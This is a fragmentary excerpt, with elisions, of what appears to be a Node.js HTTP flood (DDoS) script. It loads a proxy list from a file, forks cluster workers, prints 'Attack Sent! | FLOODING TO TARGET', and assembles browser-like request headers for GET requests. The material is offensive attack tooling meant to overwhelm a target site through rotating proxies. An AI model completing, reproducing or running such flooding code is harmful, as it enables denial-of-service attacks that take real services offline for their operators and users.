...
var mode = 'GET';
var proxies = fs.readFileSync(proxyfile, 'utf-8')
    .toString()
    .replace(/\r/g, '')
    .split('\x0A');
...
if (cluster.isMaster) {
    console.log('Attack Sent! | FLOODING TO TARGET');
    ...
    function main() {
        ...
        payload['accept-encoding'] = 'gzip, deflate, br, zstd';
        payload['accept-language'] = 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
